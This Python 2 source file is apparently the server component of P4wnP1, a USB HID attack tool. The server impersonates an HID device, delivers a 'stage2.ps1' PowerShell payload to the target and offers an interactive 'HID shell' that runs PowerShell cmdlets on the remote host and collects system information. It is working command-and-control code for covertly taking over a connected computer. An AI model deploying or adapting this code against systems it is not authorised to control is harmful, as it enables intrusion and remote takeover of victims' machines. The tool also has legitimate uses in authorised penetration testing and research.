#!/usr/bin/python
import cmd
import sys
import Queue
from pydispatch import dispatcher
from LinkLayer  import LinkLayer
from TransportLayer import TransportLayer
from threading import Thread, Condition
from BlockingQueue import BlockingQueue

class Channel():
	def __init__(self, name, direction, type, subtype, id):
		self.type = type
		self.subtype = subtype
		self.direction = direction # 0 in, any other out
		self.name = name
		self.id = id
		self.bq = BlockingQueue(name=name)
		
		# should be replaced with struct.pack
		self.__channel_header = chr((self.type << 4) + self.subtype) + chr(self.id)
		self.__channel_header_len = len(self.__channel_header)
		self.__external_condition = []
	
	def add_condition(self, cond):
		self.__external_condition.append(cond)

	def remove_condition(self, cond):
		self.__external_condition.remove(cond)

	def get_header(self):
		return self.__channel_header

	def data_available(self):
		return self.bq.data_available()

	# blocking
	def read(self):
		return self.bq.get()

	def write(self, data):
		for cond in self.__external_condition:
			cond.acquire()

		self.bq.put(data)			

		for cond in self.__external_condition:
			cond.notifyAll()
			cond.release()
		

class RemoteProcess():
	def __init__(self, id, name = ""):
		self.id = id # unique ID (mustn't necessarily be the real proccess ID, but good idea)

		# note: a RemoteProcess is meant to be ran on remote client
		#       thus from P4wnP1 server perspective its stdout is input,
		#	while its stdin is output ... and so on
		self.channels = (
			Channel(name = "STDIN", direction = 1, type = 3, subtype = 1, id = self.id),
			Channel(name = "STDOUT", direction = 0, type = 3, subtype = 2, id = self.id),
			Channel(name = "STDERR", direction = 0, type = 3, subtype = 3, id = self.id),
			Channel(name = "CTRL_TO_PROC", direction = 0, type = 3, subtype = 4, id = self.id),
			Channel(name = "CTRL_FROM_PROC", direction = 1, type = 3, subtype = 5, id = self.id))

		# fill dicts
		self._namedict = {}
		self._headerdict = {}
		self._ins = {}
		self._outs = {}
		self.__cond_input = Condition() # thread condition which triggers if data is received on one of the input channels
		for ch in self.channels:
			self._namedict[ch.name] = ch
			if ch.direction == 0: # in
				self._ins[ch.name] = ch
				ch.add_condition(self.__cond_input) # add input notifier threading condition to underlying channel
				# !!! some cleanup should be implemented !!!
			else:
				self._outs[ch.name] = ch
			
			self._headerdict[ch.get_header()] = ch

	def cleanup(self):
		# remove condition from underlying channels
		# destroy underlying channels and blockingqueues
		pass
		

	def get_in_channels(self):
		return self._ins.values()

	def get_out_channels(self):
		return self._outs.values()

	def get_channel_by_header(self, type, subtype):
		header = chr((type << 4) + subtype) + chr(self.id)
		return self._headerdict[header]

	def write_to(self, channel_name, data):
		self.__cond_input.acquire()
		# should raise exception if channel not known
		self._namedict[channel_name].write(data)

		# if channel belongs to input channels, trigger threading condition
		if channel_name in self._ins.keys():
			self.__cond_input.notifyAll()

		self.__cond_input.release()

	# blocking
	def read_from(self, channel_name):
		# should raise exception if channel not known
		self._namedict[channel_name].read()

	def __in_channels_with_data(self):
		channels_with_data = []
		# check all input channels, if there's already data available
		for ch in self._ins.values():
			# if current channel has data available, ad name to channels_with_data
			if ch.data_available():
				channels_with_data.append(ch)
		return channels_with_data

	def wait_for_in_channels(self):
		"""
		Waits till one of the input channels received data and returns
		
		Note: The channel which was responsible to end the wait isn't
		returned by this method to avoid errors, because meanwhile
		other input channels could have received data. Not returning
		the issuing channel forces checking of all input channels.

		Example (for Error to be avoided):
			STDOUT channel has been responsible for ending wait_for_in_channels().
			If only pending STDOUT data is processed, data from STDERR would be missed
			if arrived meanwhile.
		"""

		self.__cond_input.acquire()
		
		# if data was available on one of the channels, return immediately
		channels_with_data = self.__in_channels_with_data()
		if len(channels_with_data) > 0:
			self.__cond_input.release()
			return channels_with_data

		# if we are here, there was no data in input channels and we wait for the threading condition
		self.__cond_input.wait()

		channels_with_data = self.__in_channels_with_data()
		if len(channels_with_data) > 0:
			self.__cond_input.release()
			return channels_with_data

		self.__cond_input.release()

		

class P4wnP1(cmd.Cmd):
	"""
	Maybe this is the class implementing P4wnP1 HID channel user prompt
	... maybe not, who knows ?!
	"""

	DEBUG=True
	
	CHANNEL_TYPE_CONTROL = 1 # must exist only once
	CHANNEL_TYPE_SOCKET = 2
	CHANNEL_TYPE_PROCESS = 3
	CHANNEL_TYPE_FILE_TRANSFER = 4
	CHANNEL_TYPE_PORT_FORWARD = 5
	CHANNEL_TYPE_SOCKS = 6

	CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_REQUEST = 1 # send by peer (client) if it wants to receive stage2
	CHANNEL_SUBTYPE_CONTROL_SERVER_STAGE2_RESPONSE = 1 # send by us (server) while delivering stage 2 (uses same value as request, as this is the other communication directin: server to client)
	CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_RCVD = 2 # send by peer if stage 2 is received completly
	CHANNEL_SUBTYPE_CONTROL_SERVER_SYSINFO_REQUEST = 3
	CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE = 3 

	# maybe unneeded, could be packed with data
	CHANNEL_SUBTYPE_PROCESS_STDIN = 1
	CHANNEL_SUBTYPE_PROCESS_STDOUT = 2
	CHANNEL_SUBTYPE_PROCESS_STDERR = 3
	CHANNEL_SUBTYPE_PROCESS_CTRL_TO_PROC = 4
	CHANNEL_SUBTYPE_PROCESS_CTRL_FROM_PROC = 5

	CHANNEL_SUBTYPE_FILE_TRANSFER_SEND = 1
	CHANNEL_SUBTYPE_FILE_TRANSFER_RECV = 2

	CHANNEL_SUBTYPE_PORT_FORWARD_REMOTE = 1
	CHANNEL_SUBTYPE_PORT_FORWARD_LOCAL = 1

	# SOCKS subtype: recheck if needed, should be part of proto and
	# (socks should be interpreted by client directly)
	CHANNEL_SUBTYPE_SOCKS_START = 1
	CHANNEL_SUBTYPE_SOCKS_END = 2
	CHANNEL_SUBTYPE_SOCKS_CONNECT = 2
	CHANNEL_SUBTYPE_SOCKS_ESTABLISHED = 2
	CHANNEL_SUBTYPE_SOCKS_RESET = 2


	def __init__(self, linklayer, transportlayer, stage2 = ""):
		# state value to inform sub threads of running state
		self.running = False	
		self.stage2=stage2

		self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")

		# channel  type/subtype received by input thread (to help handler to decide about responsibility on notify
		self.received_channel_type = 0
		self.received_channel_subtype = 0
		self.received_channel_data = ""
		self.received_stream_handled = False

		self.server_thread_in = Thread(target = self.__input_handler, name = "P4wnP1 Server Input Loop", args = ( ))
		self.server_thread_out = Thread(target = self.__output_handler, name = "P4wnP1 Server Output Loop", args = ( ))

		self.tl = transportlayer
		self.ll = linklayer

		cmd.Cmd.__init__(self)
		self.prompt = "P4wnP1 HID shell > "

		self.__create_channels()

	def __create_channels(self):

		# channel creation shown here should be handled by sort of "Register" method (implies Unregister method)

		# channels for powershell RemoteProcess
		# Note: As remote process creation isn't currently implemented, fixed number 222 is used
		self.RPC_ps = RemoteProcess(222, "PowerShell")

		self.input_channels = {}
		# add input channels of PowerShell remote process
		for ch_in in self.RPC_ps.get_in_channels():
			self.input_channels[ch_in.get_header()] = ch_in

		self.output_channels = {}
		# add output channels of PowerShell remote process
		for ch_out in self.RPC_ps.get_out_channels():
			self.output_channels[ch_out.get_header()] = ch_out
	

	@staticmethod
	def print_debug(str):
		if P4wnP1.DEBUG:
			print "P4wnP1 Server (DEBUG): {}".format(str)
		

	def start(self):
		# start LinkLayer Threads
		print "Starting P4wnP1 server..."
		self.ll.start()
		
		self.running = True
		self.server_thread_in.start()
		print "Server input thread started."
		self.server_thread_out.start()
		print "Server output thread started."

	def stop(self):
		self.running = False

	def send(self, channel_type, channel_subtype, data = ""):
		stream = chr(channel_subtype + (channel_type << 4)) + data
		self.tl.write_stream(stream)

	def set_stage2(self, stage2_str):
		self.stage2 = stage2_str

	def __output_handler(self):
		while self.running:
                        # processing output data
			for ch in self.output_channels.itervalues():
				while ch.data_available(): # non blocking check
					# send out data
					outdata = ch.read() # blockin read
					outstream = ch.get_header() + outdata
					self.tl.write_stream(outstream)

	def __input_handler(self):
		while self.running:
			# processing input data


			indata = False
			bytes_rcvd = 0
			while self.tl.data_available():
				stream = self.tl.pop_input_stream()
				_byte1 = ord(stream[0])
				channel_type = _byte1 >> 4
				channel_subtype = _byte1 & 15

				bytes_rcvd += len(stream)

				#print "P4wnP1 Server: received stream, channel type {0}, channel subtype {1}, data: {2}".format(channel_type, channel_subtype, data)

				if channel_type == P4wnP1.CHANNEL_TYPE_CONTROL:
					data = stream[1:]
					P4wnP1.print_debug("Data received on control channel")
					if channel_subtype == P4wnP1.CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_REQUEST:
						P4wnP1.print_debug("Control channel: CLIENT_STAGE2_REQUEST")
						# send back stage 2
						self.send(P4wnP1.CHANNEL_TYPE_CONTROL, P4wnP1.CHANNEL_SUBTYPE_CONTROL_SERVER_STAGE2_RESPONSE, self.stage2)
					elif channel_subtype == P4wnP1.CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_RCVD:
						P4wnP1.print_debug("Control channel: CLIENT_STAGE2_RCVD")
					elif channel_subtype == P4wnP1.CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE:
						self.control_sysinfo_response.put(data.decode("UTF8"))
					else:
						P4wnP1.print_debug("Control channel: Unknown subtype {}".format(channel_subtype))
				elif channel_type == P4wnP1.CHANNEL_TYPE_PROCESS:
					_byte2 = ord(stream[1])
					channel_id = _byte2
					header = stream[:2]
					data = stream[2:]

					# check if we have a input channel for the header
					try:
						target_ch = self.input_channels[header]
					except KeyError:
						P4wnP1.print_debug("No channel found for input data with header {0}".format(header.encode("hex")))
						continue
					# write data to the channel
					target_ch.write(data)
						
				else:
					P4wnP1.print_debug("Unknown channel type {0} (subtype {1})".format(channel_type, channel_subtype))


	# loose definition, data argument has to be produced by LinkLayer
	def handle_link_layer(self, signal, data):
		print "LinkLayer Handler called.."
		print "Signal:"
		print signal
		print "Data:"
		print repr(data)

	# overwrite cmd.emptyline()
	def emptyline(self):
		# do nothing
		pass

	# overwite cmdloop
	def cmdloop(self):
		print "Called custom cmd loop"
		
		# call parent
		cmd.Cmd.cmdloop(self)

	# methods called by underlying "cmd" module start with "do_..."
	def do_exit(self, line):
		print "Exitting..."
		# self.ll.stop() # should happen in global finally statement
		sys.exit()

	def do_ps(self, line):
		"""
		Call a single PowerShell cmdlet on remote host and print the result.

		STDERR is returned, too.

		Note: 	Current implementation isn't robust against cmdlets forcing user interaction
			on the host. Calling "Read-Host" for instance, will block this call forever,
			as data won't be returned without interaction from the remote host itself.
		"""
		if len(line) > 0:
			# send line to PowerShell input stream (header is added by outstream
			self.RPC_ps.write_to("STDIN", line)

			# wait till some response is received
			channels_with_data = self.RPC_ps.wait_for_in_channels()

			# !!! by design wait_for_in_channels() returns ONLY channels
			# which contain data at time of calling
			
			# print out all received output
			for ch in channels_with_data:
				if ch.name == "STDERR":
					print "PowerShell Error: \n{0}".format(ch.read())
				elif ch.name == "STDOUT":
					print ch.read()
				else:
					print "Data from unexpected channel {0}: {1}".format(ch.name, ch.read())
	

	def do_systeminfo(self, line):
		print "Waiting for target to deliver systeminfo..."
		self.send(P4wnP1.CHANNEL_TYPE_CONTROL, P4wnP1.CHANNEL_SUBTYPE_CONTROL_SERVER_SYSINFO_REQUEST)
		
		# wait for response from input handler, by using a dedicated Channel (get blocks till data received)
		print self.control_sysinfo_response.get()


if __name__ == "__main__":
	try:
		dev_file_in_path = "/dev/hidg1"
		dev_file_out_path = "/dev/hidg1"

		HIDin_file = open(dev_file_in_path, "rb")
		HIDout_file = open(dev_file_out_path, "wb")

		# the linklayer starts several communication threads
		# for raw HID communication, the threads are started with separate start() method
		ll = LinkLayer(HIDin_file, HIDout_file)

		# transport layer automatically registers for linklayer events using pydispatcher
		# in current implementation LinkLayer does nothing but providing an inbound queue
		# Note: As every stream crosses TransportLayer, that would be the place to manipulate
		#	streams if needed (for example encryption)
		tl = TransportLayer()		


		server = P4wnP1(ll, tl)
		with open("stage2.ps1", "rb") as f:
			server.set_stage2(f.read())
		server.start() # starts link layer (waiting for initial connection) and server input thread
		server.cmdloop()

	except Exception as e:
		print "Exception: " + str(type(e)) + ":"
		print "\t{}".format(e.message)
		exc_type, exc_obj, exc_tb = sys.exc_info()
		print "\tLine: {}".format(exc_tb.tb_lineno)
	finally:

		print "Cleaning Up..."
		ll.stop() # send stop event to read and write loop of link layer
		HIDout_file.close()
		HIDin_file.close()
		try:
			server.stop()
		except:
			pass
		sys.exit()
